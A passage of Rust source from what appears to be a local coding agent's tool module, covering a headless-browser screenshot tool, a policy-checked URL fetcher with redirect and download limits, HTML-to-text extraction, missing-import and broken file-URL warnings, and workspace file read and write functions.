        let parsed = url::Url::parse(target)
            .map_err(|_| ToolError::Denied(format!("`{target}` is not a valid URL")))?;
        let local = matches!(
            parsed.host_str(),
            Some("localhost" | "127.0.0.1" | "[::1]" | "::1")
        );
        if !local {
            return Err(ToolError::Denied(format!(
                "look_at shows pages on this machine -- a local server (http://localhost:PORT) or \
                 an HTML file in the workspace -- and `{target}` is neither"
            )));
        }
        policy.require(Approval::LocalService)?;
        parsed.to_string()
    } else {
        let path = policy.resolve(Path::new(target))?;
        if !path.is_file() {
            return Err(ToolError::Denied(format!(
                "`{target}` is not a file in the workspace; give an HTML file's path or a local \
                 server's URL (http://localhost:PORT/...)"
            )));
        }
        url::Url::from_file_path(&path)
            .map_err(|_| ToolError::Denied(format!("`{target}` cannot be opened as a page")))?
            .to_string()
    };
    let browser = browser_executable().ok_or_else(|| {
        ToolError::Denied(
            "no browser to take the screenshot with: install Chrome or Chromium, or set \
             PWR_BROWSER to one"
                .into(),
        )
    })?;
    let root = policy
        .root
        .canonicalize()
        .unwrap_or_else(|_| policy.root.clone());
    let scratch = root.join(SCRATCH_DIRECTORY).join("look");
    std::fs::create_dir_all(&scratch)?;
    let shot = scratch.join(format!(
        "shot-{}.png",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|elapsed| elapsed.as_nanos())
            .unwrap_or_default()
    ));
    let mut browsing = policy.clone();
    browsing.extra_readable.push(browser_home(&browser));
    browsing
        .approvals
        .retain(|approval| *approval != Approval::NetworkAccess);
    if !browsing.approvals.contains(&Approval::LocalService) {
        browsing.approvals.push(Approval::LocalService);
    }
    let args: Vec<String> = vec![
        "--headless=new".into(),
        // The browser's own sandbox cannot start inside PWR's, which already
        // confines it.
        "--no-sandbox".into(),
        "--disable-gpu".into(),
        "--hide-scrollbars".into(),
        "--no-first-run".into(),
        "--no-default-browser-check".into(),
        "--disable-extensions".into(),
        "--disable-background-networking".into(),
        "--disable-crash-reporter".into(),
        "--disable-breakpad".into(),
        format!("--user-data-dir={}", scratch.join("profile").display()),
        format!("--window-size={width},{height}"),
        // Each step is given time to act and the page to answer it.
        format!("--virtual-time-budget={}", 3000 + 1200 * steps.len()),
        format!("--screenshot={}", shot.display()),
        // What the page logs, and its DOM once its scripts ran, from the
        // same load as the image.
        "--enable-logging=stderr".into(),
        "--v=0".into(),
        "--dump-dom".into(),
    ];
    let mut args = args;
    // With steps, the browser opens PWR's own page, which frames the target
    // and acts on it ([`steps_page`]); to reach into the frame it is started
    // without the same-origin rule, on this one throwaway profile.
    let acting = scratch.join("steps.html");
    if steps.is_empty() {
        args.push(url.clone());
    } else {
        std::fs::write(&acting, steps_page(&url, steps))?;
        args.push("--disable-web-security".into());
        args.push("--allow-file-access-from-files".into());
        args.push(
            url::Url::from_file_path(&acting)
                .map_err(|_| ToolError::Denied("the steps could not be prepared".into()))?
                .to_string(),
        );
    }
    let browser_path = browser.to_string_lossy().into_owned();
    let temporary = Path::new(BROWSER_SCRATCH).join(format!(
        "{:08x}",
        std::process::id()
            ^ (std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|elapsed| elapsed.subsec_nanos())
                .unwrap_or_default())
    ));
    std::fs::create_dir_all(&temporary)?;
    let mut command = browsing.prepare_command(&browser_path, &args)?;
    // Chromium asks CoreFoundation for the user's application-support path
    // before --user-data-dir is applied. On hosted macOS the real home is not
    // readable in PWR's sandbox; HOME alone does not change NSHomeDirectory.
    command.env("CFFIXED_USER_HOME", root.join(SCRATCH_DIRECTORY));
    // Chromium on macOS takes its temporary directory from here, not TMPDIR.
    command.env("MAC_CHROMIUM_TMPDIR", &temporary);
    let browser_log = std::fs::File::create(scratch.join("browser-stderr.log"))?;
    let dom_file = scratch.join("dom.html");
    let dom = std::fs::File::create(&dom_file)?;
    command
        .stdin(std::process::Stdio::null())
        .stdout(dom)
        .stderr(browser_log)
        .kill_on_drop(true);
    #[cfg(unix)]
    command.process_group(0);
    let mut child = command.spawn()?;
    let mut group = ProcessGroupGuard::new(child.id());
    // The browser writes the file and does not always exit after it: wait for
    // a file whose size has settled, then end the browser.
    let deadline = std::time::Instant::now() + policy.timeout.min(Duration::from_secs(45));
    let mut last_size = None;
    let taken = loop {
        tokio::time::sleep(Duration::from_millis(250)).await;
        let size = std::fs::metadata(&shot).map(|meta| meta.len()).ok();
        if size.is_some_and(|size| size > 0) && size == last_size {
            break true;
        }
        last_size = size;
        if child.try_wait().ok().flatten().is_some() {
            break std::fs::metadata(&shot)
                .map(|meta| meta.len() > 0)
                .unwrap_or(false);
        }
        if std::time::Instant::now() >= deadline {
            break false;
        }
    };
    // The DOM is printed with the image; give it a moment to be whole.
    if taken {
        let mut last_size = None;
        for _ in 0..8 {
            let size = std::fs::metadata(&dom_file).map(|meta| meta.len()).ok();
            if size.is_some_and(|size| size > 0) && size == last_size {
                break;
            }
            last_size = size;
            tokio::time::sleep(Duration::from_millis(250)).await;
        }
    }
    group.terminate();
    let _ = child.kill().await;
    let _ = child.wait().await;
    let _ = std::fs::remove_dir_all(&temporary);
    if !taken {
        let _ = std::fs::remove_file(&shot);
        let diagnostic =
            std::fs::read_to_string(scratch.join("browser-stderr.log")).unwrap_or_default();
        let diagnostic = diagnostic.chars().take(2_000).collect::<String>();
        let hint = if diagnostic.contains("CVDisplayLinkCreateWithCGDisplay failed") {
            "macOS display initialization failed (CVDisplayLink). Use an installed Chromium headless shell via PWR_BROWSER; this capture failure does not establish that the local server failed."
        } else {
            "If it is a local server, is it running (start_service) and on that port?"
        };
        return Err(ToolError::Denied(format!(
            "the page at {url} could not be captured: the browser wrote no screenshot. {hint} {diagnostic}"
        )));
    }
    let log = std::fs::read_to_string(scratch.join("browser-stderr.log")).unwrap_or_default();
    let _ = std::fs::remove_file(scratch.join("browser-stderr.log"));
    let console: Vec<String> = console_messages(&log)
        .into_iter()
        .map(|message| policy.redact(&message).0)
        .collect();
    let dom = std::fs::read_to_string(&dom_file).unwrap_or_default();
    let _ = std::fs::remove_file(&dom_file);
    let _ = std::fs::remove_file(&acting);
    let (title, text) = if steps.is_empty() {
        visible_text(&dom)
    } else {
        // What the steps did, then what the page shows after them.
        let (title, _) = visible_text(&dom);
        let done = kept_text(&dom, "pwr-steps");
        let shown = kept_text(&dom, "pwr-text");
        (
            title,
            format!("{done}\n\nThe page after the steps:\n{shown}"),
        )
    };
    let text = policy.redact(&text).0;
    let text = if text.chars().count() > PAGE_TEXT_CHARS {
        let kept: String = text.chars().take(PAGE_TEXT_CHARS).collect();
        format!("{kept}\n[... the page's text goes on]")
    } else {
        text
    };
    let status = page_status(&url).await;
    let bytes = std::fs::read(&shot)?;
    let _ = std::fs::remove_file(&shot);
    use sha2::Digest as _;
    let digest = format!("{:x}", sha2::Sha256::digest(&bytes));
    let images = root.join(STATE_DIRECTORY).join("images");
    std::fs::create_dir_all(&images)?;
    let image = images.join(format!("{digest}.png"));
    std::fs::write(&image, &bytes)?;
    Ok(LookResult {
        target: target.to_owned(),
        width,
        height,
        image,
        bytes: bytes.len() as u64,
        status,
        title: title.map(|title| policy.redact(&title).0),
        text,
        console,
    })
}

/// The text [`steps_page`] left in the element with this id, read back from
/// the DOM the browser printed.
fn kept_text(dom: &str, id: &str) -> String {
    let Some(at) = dom.find(&format!("id=\"{id}\"")) else {
        return String::new();
    };
    let rest = &dom[at..];
    let Some(open) = rest.find('>') else {
        return String::new();
    };
    let body = &rest[open + 1..];
    let body = &body[..body.find("</pre>").unwrap_or(body.len())];
    body.replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&amp;", "&")
        .trim()
        .to_owned()
}

/// The HTTP status a local server answers a page with, or `None` for a file
/// or a server that does not answer within ten seconds.
async fn page_status(url: &str) -> Option<u16> {
    if !url.starts_with("http") {
        return None;
    }
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        // The separate status probe must never follow a local redirect off-host.
        .redirect(reqwest::redirect::Policy::none())
        .no_proxy()
        .build()
        .ok()?;
    client
        .get(url)
        .send()
        .await
        .ok()
        .map(|response| response.status().as_u16())
}

/// Fetches one URL as text.
///
/// This is a fetch, not a search: there is no index and no query, so a caller
/// must already know the address. Naming it search would promise something it
/// does not do.
///
/// The result is untrusted input in the strongest sense — a remote party wrote
/// it — so it is bounded, redacted and hashed exactly like a file read, and it
/// grants nothing: a page saying to run a command is prose, and the command
/// still has to pass policy.
pub async fn fetch_url(
    policy: &ToolPolicy,
    url: &str,
    save_as: Option<&str>,
) -> Result<FetchResult, ToolError> {
    policy.require(Approval::NetworkAccess)?;
    // Checked before anything is fetched: a download aimed outside the
    // workspace, or at a file already there, is refused without the traffic.
    let destination = match save_as.map(str::trim).filter(|path| !path.is_empty()) {
        None => None,
        Some(relative) => {
            policy.refuse_if_protected(Path::new(relative))?;
            let path = policy.resolve(Path::new(relative))?;
            if path.exists() {
                return Err(ToolError::Denied(format!(
                    "{relative} already exists; delete_path it first or save_as another path"
                )));
            }
            Some((relative.to_owned(), path))
        }
    };
    let parsed = url::Url::parse(url)
        .map_err(|_| ToolError::Denied("url is not a valid absolute URL".into()))?;
    if !FETCH_SCHEMES.contains(&parsed.scheme()) {
        return Err(ToolError::Denied(format!(
            "scheme {} is not fetchable; only http and https are",
            parsed.scheme()
        )));
    }
    let client = reqwest::Client::builder()
        .timeout(if destination.is_some() {
            policy.timeout.max(FETCH_SAVE_TIMEOUT)
        } else {
            policy.timeout
        })
        // Sites refuse an anonymous client: measured 2026-09-25, Wikipedia
        // answered 403 "Please set a user-agent" to the one page a model had
        // asked for to settle a question it then reasoned about for twenty
        // minutes.
        .user_agent(concat!(
            "PWR/",
            env!("CARGO_PKG_VERSION"),
            " (local coding agent; +https://github.com/VitoSanta/PWR)"
        ))
        // A redirect can change scheme or host after the check above, so each
        // hop is checked again rather than followed blindly; refusing them
        // all left a model with a bare 301 for an http link to an https site.
        .redirect(reqwest::redirect::Policy::custom(|attempt| {
            if attempt.previous().len() >= FETCH_REDIRECTS {
                attempt.stop()
            } else if FETCH_SCHEMES.contains(&attempt.url().scheme()) {
                attempt.follow()
            } else {
                attempt.stop()
            }
        }))
        .build()
        .map_err(|_| ToolError::Denied("could not build a fetch client".into()))?;
    let response = client.get(parsed.clone()).send().await.map_err(|error| {
        if error.is_timeout() {
            ToolError::Timeout
        } else {
            ToolError::Denied("fetch failed".into())
        }
    })?;
    let status = response.status().as_u16();
    let content_type = response
        .headers()
        .get(reqwest::header::CONTENT_TYPE)
        .and_then(|value| value.to_str().ok())
        .map(str::to_owned);
    let declared_length = response.content_length();
    let url_text = response.url().to_string();
    use futures_util::StreamExt as _;
    let mut body = response.bytes_stream();
    let body_error = |error: reqwest::Error| {
        if error.is_timeout() {
            ToolError::Timeout
        } else {
            ToolError::Io(std::io::Error::other("fetch response body failed"))
        }
    };
    if let Some((relative, path)) = destination {
        use sha2::Digest as _;
        use std::io::Write as _;
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        // An error answer is not a download. Saving the error page left a
        // file at the path, so the next try was refused as an overwrite, and
        // a model guessing at an archive's name spent twenty actions on a
        // delete-then-fetch dance (measured 2026-09-26, CMake on macOS). The
        // answer's first bytes are shown instead, and nothing is written.
        if !(200..300).contains(&status) {
            let mut first = Vec::new();
            while first.len() < 2048
                && let Some(Ok(chunk)) = body.next().await
            {
                first.extend_from_slice(&chunk[..chunk.len().min(2048 - first.len())]);
            }
            let said = String::from_utf8_lossy(&first).into_owned();
            let said = if content_type
                .as_deref()
                .is_some_and(|kind| kind.to_ascii_lowercase().contains("html"))
            {
                html_to_text(&said)
            } else {
                said
            };
            return Ok(FetchResult {
                url: url_text,
                status,
                content: said.trim().chars().take(600).collect(),
                truncated: false,
                redacted: false,
                artifact_hash: String::new(),
                content_type,
                saved_as: None,
                bytes: declared_length,
                sha256: None,
                note: Some(format!(
                    "the server answered {status}, so nothing was saved to {relative}. The \
                     address is wrong: fetch the page that lists the downloads (for a GitHub \
                     release, https://api.github.com/repos/OWNER/REPO/releases/latest or \
                     .../releases/tags/TAG lists every asset's exact name) and use a name from it."
                )),
            });
        }
        // Written beside the destination and renamed, so a download cut short
        // never leaves a file that looks complete.
        let partial = path.with_extension("pwr-partial");
        let mut file = std::fs::File::create(&partial)?;
        let mut sha256 = sha2::Sha256::new();
        let mut hasher = blake3::Hasher::new();
        let mut written = 0u64;
        while let Some(chunk) = body.next().await {
            let chunk = match chunk {
                Ok(chunk) => chunk,
                Err(error) => {
                    let _ = std::fs::remove_file(&partial);
                    return Err(body_error(error));
                }
            };
            written = written.saturating_add(chunk.len() as u64);
            if written > FETCH_SAVE_BYTES {
                let _ = std::fs::remove_file(&partial);
                return Err(ToolError::Denied(format!(
                    "the download passed {} GiB and was stopped; nothing was kept",
                    FETCH_SAVE_BYTES / (1024 * 1024 * 1024)
                )));
            }
            sha256.update(&chunk);
            hasher.update(&chunk);
            file.write_all(&chunk)?;
        }
        file.flush()?;
        drop(file);
        std::fs::rename(&partial, &path)?;
        return Ok(FetchResult {
            url: url_text,
            status,
            content: String::new(),
            truncated: false,
            redacted: false,
            artifact_hash: hasher.finalize().to_hex().to_string(),
            content_type,
            saved_as: Some(relative.clone()),
            bytes: Some(written),
            sha256: Some(format!("{:x}", sha256.finalize())),
            note: Some(format!(
                "saved to {relative}; compare sha256 with the checksum the release page \
                 publishes before using it"
            )),
        });
    }
    let html = content_type
        .as_deref()
        .is_some_and(|kind| kind.to_ascii_lowercase().contains("html"));
    // A page is mostly markup: its text is read from more of it than the
    // limit, which then bounds the text rather than the markup.
    let text_limit = policy.output_limit.min(FETCH_TEXT_BYTES);
    let raw_limit = if html {
        text_limit.saturating_mul(8).min(FETCH_HTML_BYTES)
    } else {
        text_limit
    };
    let mut retained = Vec::with_capacity(raw_limit.min(64 * 1024));
    let mut hasher = blake3::Hasher::new();
    let mut observed = 0usize;
    let mut binary = content_type.as_deref().is_some_and(|kind| !textual(kind));
    while !binary && let Some(chunk) = body.next().await {
        let chunk = chunk.map_err(body_error)?;
        observed = observed.saturating_add(chunk.len());
        hasher.update(&chunk);
        let remaining = raw_limit.saturating_sub(retained.len());
        retained.extend_from_slice(&chunk[..chunk.len().min(remaining)]);
        if content_type.is_none() && looks_binary(&retained) {
            binary = true;
        }
    }
    // Measured 2026-09-26: a Go release archive fetched this way reached the
    // model as 64 KiB of replacement characters -- 30,000 tokens, twice in
    // one session -- and was no use to it as text or as a file.
    if binary {
        let kind = content_type
            .clone()
            .unwrap_or_else(|| "binary data".to_owned());
        let size = declared_length
            .map(|bytes| format!(", {bytes} bytes"))
            .unwrap_or_default();
        return Ok(FetchResult {
            url: url_text,
            status,
            content: String::new(),
            truncated: true,
            redacted: false,
            artifact_hash: hasher.finalize().to_hex().to_string(),
            content_type,
            saved_as: None,
            bytes: declared_length,
            sha256: None,
            note: Some(format!(
                "this is a file ({kind}{size}), not text, so none of it is shown. To download \
                 it, call fetch_url again with save_as set to a workspace path -- a toolchain \
                 under `{TOOLCHAINS_DIRECTORY}/` -- and then extract it with tar or unzip."
            )),
        });
    }
    let mut truncated = observed > retained.len();
    let mut bounded = String::from_utf8_lossy(&retained).into_owned();
    if html {
        bounded = html_to_text(&bounded);
        if bounded.len() > text_limit {
            let mut end = text_limit;
            while !bounded.is_char_boundary(end) {
                end -= 1;
            }
            bounded.truncate(end);
            truncated = true;
        }
    }
    let (content, redacted) = policy.redact(&bounded);
    Ok(FetchResult {
        url: url_text,
        status,
        artifact_hash: hasher.finalize().to_hex().to_string(),
        content,
        truncated,
        redacted,
        content_type,
        saved_as: None,
        bytes: None,
        sha256: None,
        note: truncated.then(|| {
            "only the beginning is shown. To have all of it, fetch it again with save_as set to \
             a workspace path, then search it or read_file the part you need."
                .to_owned()
        }),
    })
}

/// The most of an HTML page read to find its text.
const FETCH_HTML_BYTES: usize = 2 * 1024 * 1024;

/// A page's readable text: scripts, styles and markup removed, block
/// elements as line breaks, the common entities decoded. Deliberately small --
/// not a browser -- so a model reads the article rather than its `<head>`.
fn html_to_text(html: &str) -> String {
    let lower = html.to_ascii_lowercase();
    let mut out = String::with_capacity(html.len() / 3);
    let mut index = 0;
    while index < html.len() {
        let Some(offset) = html[index..].find('<') else {
            out.push_str(&html[index..]);
            break;
        };
        out.push_str(&html[index..index + offset]);
        let open = index + offset;
        let skip_to = ["script", "style", "noscript", "svg", "head"]
            .iter()
            .find(|name| {
                lower[open + 1..].starts_with(*name)
                    && lower[open + 1 + name.len()..]
                        .starts_with(|c: char| c == '>' || c.is_ascii_whitespace())
            })
            .and_then(|name| {
                let close = format!("</{name}");
                lower[open..].find(&close).map(|at| open + at + close.len())
            });
        let from = skip_to.unwrap_or(open);
        let Some(end) = html[from..].find('>') else {
            break;
        };
        let tag = &lower[open + 1..(from + end).min(lower.len())];
        let name = tag
            .trim_start_matches('/')
            .split(|c: char| c.is_ascii_whitespace() || c == '>' || c == '/')
            .next()
            .unwrap_or("");
        if matches!(
            name,
            "p" | "br"
                | "div"
                | "li"
                | "tr"
                | "h1"
                | "h2"
                | "h3"
                | "h4"
                | "h5"
                | "h6"
                | "table"
                | "section"
                | "article"
                | "pre"
                | "dd"
                | "dt"
        ) {
            out.push('\n');
        } else if matches!(name, "td" | "th") && !tag.starts_with('/') {
            out.push_str(" | ");
        }
        index = from + end + 1;
    }
    let decoded = out
        .replace("&nbsp;", " ")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&apos;", "'")
        .replace("&amp;", "&");
    let mut text = String::with_capacity(decoded.len());
    let mut blank = 0;
    for line in decoded.lines() {
        let line = line.split_whitespace().collect::<Vec<_>>().join(" ");
        if line.is_empty() {
            blank += 1;
            if blank == 1 && !text.is_empty() {
                text.push('\n');
            }
            continue;
        }
        blank = 0;
        text.push_str(&line);
        text.push('\n');
    }
    text
}

/// The refusal for acting on a file that is not there, saying what to do
/// instead of passing on the operating system's "No such file or directory".
fn missing_file(relative: &Path, verb: &str) -> ToolError {
    let what = relative.display();
    ToolError::Denied(if verb == "delete" {
        format!("{what} does not exist, so there is nothing to delete")
    } else {
        format!(
            "{what} does not exist, so there is nothing to {verb}. Create it with write_file, \
             or check the path with list_tree."
        )
    })
}

/// Node's built-in modules, which resolve without anything installed.
const NODE_BUILTINS: &[&str] = &[
    "assert",
    "async_hooks",
    "buffer",
    "child_process",
    "cluster",
    "console",
    "constants",
    "crypto",
    "dgram",
    "diagnostics_channel",
    "dns",
    "domain",
    "events",
    "fs",
    "http",
    "http2",
    "https",
    "inspector",
    "module",
    "net",
    "os",
    "path",
    "perf_hooks",
    "process",
    "punycode",
    "querystring",
    "readline",
    "repl",
    "stream",
    "string_decoder",
    "sys",
    "test",
    "timers",
    "tls",
    "trace_events",
    "tty",
    "url",
    "util",
    "v8",
    "vm",
    "wasi",
    "worker_threads",
    "zlib",
];

/// The packages a JavaScript or TypeScript file imports that the workspace
/// does not provide: neither a built-in module nor anything in a
/// `node_modules` between the file and the workspace root.
pub fn missing_packages(root: &Path, file: &Path, text: &str) -> Vec<String> {
    let extension = file
        .extension()
        .map(|e| e.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();
    if !["js", "mjs", "cjs", "jsx", "ts", "tsx", "mts", "cts"].contains(&extension.as_str()) {
        return Vec::new();
    }
    static IMPORT: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    let import = IMPORT.get_or_init(|| {
        regex::Regex::new(
            r#"(?m)(?:\brequire\s*\(\s*|\bimport\s*\(\s*|^\s*import\s+(?:type\s+)?|\bfrom\s+)(['"])([^'"\n]+)['"]"#,
        )
        .expect("static regex")
    });
    let mut missing = Vec::new();
    for capture in import.captures_iter(text) {
        // A type-only import is erased before anything runs.
        let start = capture.get(0).map_or(0, |m| m.start());
        let line_start = text[..start].rfind('\n').map_or(0, |i| i + 1);
        if text[line_start..].trim_start().starts_with("import type ") {
            continue;
        }
        let specifier = &capture[2];
        if specifier.starts_with(['.', '/', '#']) || specifier.contains(':') {
            continue;
        }
        let mut segments = specifier.split('/');
        let package = match segments.next() {
            Some(scope) if scope.starts_with('@') => match segments.next() {
                Some(name) => format!("{scope}/{name}"),
                None => continue,
            },
            Some(name) => name.to_string(),
            None => continue,
        };
        if NODE_BUILTINS.contains(&package.as_str()) || missing.contains(&package) {
            continue;
        }
        let installed = file
            .ancestors()
            .skip(1)
            .take_while(|dir| dir.starts_with(root))
            .any(|dir| dir.join("node_modules").join(&package).exists());
        if !installed {
            missing.push(package);
        }
    }
    missing
}

/// Everything about a file just written that will fail when it runs.
fn written_file_warning(
    policy: &ToolPolicy,
    path: &Path,
    relative: &Path,
    text: &str,
) -> Option<String> {
    let found: Vec<String> = [
        missing_package_warning(policy, path, relative, text),
        broken_file_url_warning(policy, relative, text),
    ]
    .into_iter()
    .flatten()
    .collect();
    (!found.is_empty()).then(|| found.join(" "))
}

/// `file://` addresses in a file just written that lead to nothing, each
/// with the file of that name the workspace does have.
///
/// Measured 2026-09-29 (Qwen3-14B in the desktop): a Playwright test opened
/// `file:///…/test/web/index.html` while the page it had written was
/// `web/index.html` under that workspace; it rewrote the test seven times and
/// never saw the path was one folder short, since it only ever wrote paths
/// relative to the workspace.
fn broken_file_url_warning(policy: &ToolPolicy, relative: &Path, text: &str) -> Option<String> {
    static URL: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    let url =
        URL.get_or_init(|| regex::Regex::new(r#"file://([^\s'"`)<>]+)"#).expect("static regex"));
    let root = policy
        .root
        .canonicalize()
        .unwrap_or_else(|_| policy.root.clone());
    let mut notes = Vec::new();
    for capture in url.captures_iter(text) {
        let target = capture[1].trim_end_matches(['.', ',', ';']);
        let target_path = Path::new(target);
        if target_path.exists() || target.contains("${") || target.contains("__dirname") {
            continue;
        }
        let Some(name) = target_path.file_name() else {
            continue;
        };
        // A shell variable is not expanded inside a program's string, and a
        // placeholder is a path nobody filled in. Measured 2026-09-30:
        // Qwen3-14B wrote `file:///path/to/your/project/index.html`, then
        // `file://$PWD/index.html`.
        let unexpanded = target.contains('$');
        let placeholder = ["/path/to/", "/your/", "your-", "/yourname/", "/user/"]
            .iter()
            .any(|marker| target.to_ascii_lowercase().contains(marker));
        if !target.starts_with('/') && !unexpanded {
            continue;
        }
        let found = walk_workspace(&root)
            .unwrap_or_default()
            .into_iter()
            .filter(|(_, directory)| !directory)
            .map(|(candidate, _)| {
                if candidate.is_absolute() {
                    candidate
                } else {
                    root.join(candidate)
                }
            })
            .find(|candidate| candidate.file_name() == Some(name));
        let what = if unexpanded {
            "is not a file: a shell variable is not expanded inside a program's string"
        } else if placeholder {
            "is a placeholder, not a file"
        } else {
            "is not a file"
        };
        notes.push(match found {
            Some(real) => format!(
                "`file://{target}` {what}; the workspace's `{}` is at `file://{}`.",
                name.to_string_lossy(),
                real.display()
            ),
            None => format!("`file://{target}` {what} on this machine."),
        });
    }
    (!notes.is_empty()).then(|| {
        format!(
            "{} refers to a file that does not exist: {} The workspace is `{}`.",
            relative.display(),
            notes.join(" "),
            root.display()
        )
    })
}

/// Says which imports of a file just written will fail when it runs, and how
/// to fix that, or nothing when every import resolves.
fn missing_package_warning(
    policy: &ToolPolicy,
    path: &Path,
    relative: &Path,
    text: &str,
) -> Option<String> {
    let root = policy
        .root
        .canonicalize()
        .unwrap_or_else(|_| policy.root.clone());
    let path = path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
    let missing = missing_packages(&root, &path, text);
    if missing.is_empty() {
        return None;
    }
    let names = missing
        .iter()
        .map(|name| format!("`{name}`"))
        .collect::<Vec<_>>()
        .join(", ");
    Some(format!(
        "{} imports {names}, which {} not installed here, so it will fail when it runs even \
         though it parses. Run `npm install {}` (this also records it in package.json), or \
         rewrite it with Node's built-in modules only.",
        relative.display(),
        if missing.len() == 1 { "is" } else { "are" },
        missing.join(" ")
    ))
}

/// Creates a new file. Refuses to overwrite an existing one.
///
/// Creation and modification are separate capabilities on purpose: an edit
/// must carry the hash of what it replaces, and a create has nothing to hash.
/// Letting one tool do both would mean a blind overwrite is always one missing
/// argument away.
pub fn write_file(
    policy: &ToolPolicy,
    relative: &Path,
    content: &str,
) -> Result<ApplyResult, ToolError> {
    policy.refuse_if_protected(relative)?;
    if let Some(approval) = edit_approval(relative) {
        policy.require(approval)?;
    }
    let path = policy.resolve(relative)?;
    if path.exists() {
        // The hash is what the next call needs and this call already stands on
        // the file, so withholding it buys a re-read of the whole thing.
        // Measured on an 80B building an Angular site: five of its first twenty
        // actions were this refusal, each answered by reading a file it was
        // about to overwrite entirely. The same reasoning as the stale-hash
        // refusal, which has returned the current hash for the same reason.
        let hash = std::fs::read(&path)
            .map(|bytes| hash_bytes(&bytes))
            .unwrap_or_default();
        return Err(ToolError::Denied(if hash.is_empty() {
            "file exists; read it and use apply_replace with its hash".into()
        } else {
            format!(
                "file exists. To replace it whole, call apply_replace with this same content and \
                 expected_hash {hash}; there is no need to read it first."
            )
        }));
    }
    if content.len() > policy.output_limit {
        return Err(ToolError::Denied(
            "content exceeds policy size limit".into(),
        ));
    }
    // Parent directories are created only inside the workspace, since `resolve`
    // has already refused anything that escapes it.
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    atomic::write_atomic(&path, content.as_bytes(), atomic::Expect::Absent)?;
    let new_hash = hash_bytes(content.as_bytes());
    Ok(ApplyResult {
        path: relative.display().to_string(),
        normalized: None,
        previous_hash: String::new(),
        expected_hash: new_hash.clone(),
        new_hash,
        warning: written_file_warning(policy, &path, relative, content),
        excerpt: None,
    })
}

/// Reads a root-relative text file with a policy-derived byte bound.
pub fn read_file(policy: &ToolPolicy, relative: &Path) -> Result<FileReadResult, ToolError> {
    read_file_window(policy, relative, None, None)
}

/// Refuses a read of a path the workspace does not have, and says what it does.
///
/// A bare `No such file or directory (os error 2)` is the truth and none of the
/// help. Measured on the gpt-oss:20b Angular run of 2026-09-07: nine of
/// eighty-three actions went to `src/app/app.module.ts` and
/// `src/app/app.component.ts`, the file names an older Angular structure would
/// have, one of them asked for six separate times. The workspace had
/// `src/app/app.ts` and `src/app/app.config.ts` all along, and nothing in the
/// refusal said so.
///
/// Names by basename similarity rather than by guessing intent: `app.module.ts`
/// and `app.config.ts` share a stem, which is the cheapest signal that is
/// usually right and never invents a file.
fn deny_missing_path(policy: &ToolPolicy, relative: &Path) -> ToolError {
    let wanted = relative
        .file_stem()
        .map(|stem| stem.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    let first = wanted
        .split(['.', '-', '_'])
        .next()
        .unwrap_or("")
        .to_string();
    let mut near: Vec<String> = Vec::new();
    if !first.is_empty()
        && let Ok(entries) = walk_workspace(&policy.root)
    {
        for (path, directory) in entries {
            if directory || near.len() >= 5 {
                continue;
            }
            let name = path
                .file_name()
                .map(|name| name.to_string_lossy().to_lowercase())
                .unwrap_or_default();
            if name.starts_with(&first) {
                near.push(
                    path.strip_prefix(&policy.root)
                        .unwrap_or(&path)
                        .display()
                        .to_string(),
                );
            }
        }
    }
    let suggestion = if near.is_empty() {
        "Nothing in the workspace has a similar name; list_tree shows what is there.".to_string()
    } else {
        format!("The workspace has: {}.", near.join(", "))
    };
    ToolError::Denied(format!(
        "{} does not exist in this workspace. {suggestion}",
        relative.display()
    ))
}

/// Reads a window of a file, one-based and inclusive of `first_line`.
///
/// A file larger than the output bound was previously truncated mid-way with
/// nothing to say where the cut fell, so a caller could neither see the rest
/// nor ask for it. A window can be asked for, and the result says how many
/// lines the file has.
pub fn read_file_window(
    policy: &ToolPolicy,
    relative: &Path,
    first_line: Option<usize>,
    max_lines: Option<usize>,
) -> Result<FileReadResult, ToolError> {
    let path = policy.resolve_readable(relative)?;
    let metadata = std::fs::metadata(&path).map_err(|error| {
        if error.kind() == std::io::ErrorKind::NotFound {
            deny_missing_path(policy, relative)
        } else {
            ToolError::from(error)
        }
    })?;
    if !metadata.is_file() {
        return Err(ToolError::Denied(
            "read target is not a regular file".into(),
        ));
    }
    let first = first_line.unwrap_or(1).max(1);
    let last = max_lines
        .map(|count| first.saturating_add(count.saturating_sub(1)))
        .unwrap_or(usize::MAX);
    let mut file = std::fs::File::open(&path)?;
    // Decided before the file is streamed. Everything a refusal needs is in the
    // first 4096 bytes, and the loop below hashes what it reads: a binary file
    // would otherwise be read and hashed in full to produce a refusal that was
    // already decidable from its header.
    let mut prefix = Vec::with_capacity(4096);
    file.by_ref().take(4096).read_to_end(&mut prefix)?;
    if let Some(reason) = binary_reason(&prefix) {
        return Err(deny_binary(relative, &reason, "read as text"));
    }
    file.rewind()?;
    let mut chunk = [0u8; 8192];
    let mut hasher = blake3::Hasher::new();
    let mut retained = Vec::with_capacity(policy.output_limit.min(64 * 1024));
    let mut selected_bytes = 0usize;
    let mut line = 1usize;
    let mut bytes_seen = 0usize;
    let mut last_byte = None;
    loop {
        let read = file.read(&mut chunk)?;
        if read == 0 {
            break;
        }
        hasher.update(&chunk[..read]);
        for byte in &chunk[..read] {
            bytes_seen = bytes_seen.saturating_add(1);
            if line >= first && line <= last {
                selected_bytes = selected_bytes.saturating_add(1);
                if retained.len() < policy.output_limit {
                    retained.push(*byte);
                }
            }
            if *byte == b'\n' {
                line = line.saturating_add(1);
            }
            last_byte = Some(*byte);
        }
    }
    let total_lines = if bytes_seen == 0 {
        0
    } else {
        line.saturating_sub(usize::from(last_byte == Some(b'\n')))
    };
    if total_lines > 0 && first > total_lines {
        return Err(ToolError::Denied(format!(
            "first_line {first} is past the end of a {total_lines}-line file"
        )));
    }
    // `str::lines` does not include the selected window's terminal newline.
    if retained.last() == Some(&b'\n') && selected_bytes <= policy.output_limit {
